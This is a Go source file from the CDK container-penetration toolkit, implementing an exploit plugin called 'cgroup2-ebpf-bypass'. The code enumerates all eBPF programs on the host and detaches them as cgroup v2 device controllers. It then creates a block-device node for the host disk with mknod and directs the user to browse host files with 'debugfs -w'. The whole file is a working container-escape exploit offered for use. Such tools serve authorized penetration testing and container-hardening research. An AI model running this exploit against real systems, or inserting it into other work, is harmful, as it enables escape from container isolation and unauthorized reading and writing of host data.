//go:build linux && !no_cap_dac_read_search
// +build linux,!no_cap_dac_read_search

/*
Copyright 2022 The Authors of https://github.com/CDK-TEAM/CDK .

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package escaping

import (
	"fmt"
	"log"
	"os"
	"syscall"
	"unsafe"

	"github.com/cdk-team/CDK/pkg/exploit/base"
	"github.com/cdk-team/CDK/pkg/plugin"
	"github.com/cdk-team/CDK/pkg/util"
)

const (
	SYS_BPF               = 321
	BPF_PROG_DETACH       = 9
	BPF_PROG_GET_NEXT_ID  = 11
	BPF_PROG_GET_FD_BY_ID = 13
	BPF_CGROUP_DEVICE     = 6
)

type bpfObjAttr struct {
	Id        uint32
	NextId    uint32
	OpenFlags uint32
	_         uint32
}

type bpfAttachAttr struct {
	TargetFd    uint32
	AttachBpfFd uint32
	AttachType  uint32
	AttachFlags uint32
}

func detachDeviceCgroup(cgroupPath string) error {
	fd, err := syscall.Open(cgroupPath, syscall.O_RDONLY|syscall.O_DIRECTORY, 0)
	if err != nil {
		return fmt.Errorf("failed to open cgroup path %s: %v", cgroupPath, err)
	}
	defer syscall.Close(fd)
	cgroupFd := uint32(fd)

	log.Printf("Debug: Opened cgroup path, fd=%d", cgroupFd)
	log.Println("Bypassing BPF_PROG_QUERY. Scanning all eBPF programs on host and attempting blind detach...")

	var id uint32 = 0
	detachedCount := 0

	// 遍历机器上所有的 eBPF 程序 ID
	for {
		var attr bpfObjAttr
		attr.Id = id

		// 1. 获取下一个 ID
		_, _, errno := syscall.Syscall(
			SYS_BPF,
			uintptr(BPF_PROG_GET_NEXT_ID),
			uintptr(unsafe.Pointer(&attr)),
			unsafe.Sizeof(attr), // 16 bytes
		)

		if errno != 0 {
			break // 遍历结束
		}
		id = attr.NextId

		// 2. 根据 ID 获取 eBPF 程序的 FD
		var fdAttr bpfObjAttr
		fdAttr.Id = id
		r1, _, errno := syscall.Syscall(
			SYS_BPF,
			uintptr(BPF_PROG_GET_FD_BY_ID),
			uintptr(unsafe.Pointer(&fdAttr)),
			unsafe.Sizeof(fdAttr), // 16 bytes
		)

		if errno != 0 {
			continue
		}
		progFd := uint32(r1)

		// 3. 从当前 cgroup 上摘除对应的eBPF程序
		var detachAttr bpfAttachAttr
		detachAttr.TargetFd = cgroupFd
		detachAttr.AttachBpfFd = progFd
		detachAttr.AttachType = BPF_CGROUP_DEVICE

		_, _, errno = syscall.Syscall(
			SYS_BPF,
			uintptr(BPF_PROG_DETACH),
			uintptr(unsafe.Pointer(&detachAttr)),
			unsafe.Sizeof(detachAttr), // 16 bytes
		)

		if errno == 0 {
			log.Printf("Successfully detached eBPF prog ID %d", id)
			detachedCount++
		}

		syscall.Close(int(progFd)) // 关掉 FD，防止泄漏
	}

	if detachedCount > 0 {
		log.Printf("Successfully detached %d device control programs in total.", detachedCount)
	} else {
		log.Println("No matching eBPF device control programs detached (they might have already been detached). Proceeding anyway...")
	}

	return nil
}

type cgroup2EbpfBypassS struct{ base.BaseExploit }

func (p cgroup2EbpfBypassS) Desc() string {
	return "escape cgroup v2 container by detaching eBPF device controller. usage: ./cdk run cgroup2-ebpf-bypass"
}

func (p cgroup2EbpfBypassS) Run() bool {
	ver, err := util.GetCgroupVersion()
	if err != nil {
		log.Printf("Failed to get cgroup version: %v", err)
		return false
	}
	if ver != 2 {
		log.Printf("This exploit is for Cgroup V2 only. Current version: V%d", ver)
		return false
	}

	cgroupPath, err := findCgroupV2MountPoint()
	if err != nil {
		log.Printf("Warning: %v. Trying default /sys/fs/cgroup", err)
		cgroupPath = "/sys/fs/cgroup"
	}
	log.Printf("Target cgroup path: %s", cgroupPath)

	if err := detachDeviceCgroup(cgroupPath); err != nil {
		log.Printf("Exploit failed during detach: %v", err)
		return false
	}

	log.Println("Device control programs detached. Attempting to access host devices...")
	mountInfos, err := util.GetMountInfo()
	if err != nil {
		log.Printf("get mount info error: %v", err)
		return false
	}

	for _, mi := range mountInfos {
		if util.FindTargetDeviceID(&mi) {
			dev := util.MakeDev(mi.Major, mi.Minor)
			if dev == 0 {
				log.Printf("Blockdevice Major/Minor number invalid.")
				return false
			}

			os.Remove("./cdk_mknod_v2_result")
			err = syscall.Mknod("./cdk_mknod_v2_result", syscall.S_IFBLK|uint32(os.FileMode(0700)), dev)
			if err != nil {
				log.Printf("mknod err: %v", err)
				return false
			} else {
				log.Println("Exploit success! Device node created at './cdk_mknod_v2_result'")
				log.Println("Run 'debugfs -w ./cdk_mknod_v2_result' to browse host files.")
				return true
			}
		}
	}

	log.Println("Could not find suitable host device to mount.")
	return false
}

func findCgroupV2MountPoint() (string, error) {
	mountInfos, err := util.GetMountInfo()
	if err != nil {
		return "", err
	}
	for _, mi := range mountInfos {
		if mi.Fstype == "cgroup2" {
			return mi.MountPoint, nil
		}
	}
	return "", fmt.Errorf("cgroup2 mountpoint not found in /proc/self/mountinfo")
}

func init() {
	exploit := cgroup2EbpfBypassS{}
	exploit.ExploitType = "escaping"
	plugin.RegisterExploit("cgroup2-ebpf-bypass", exploit)
}
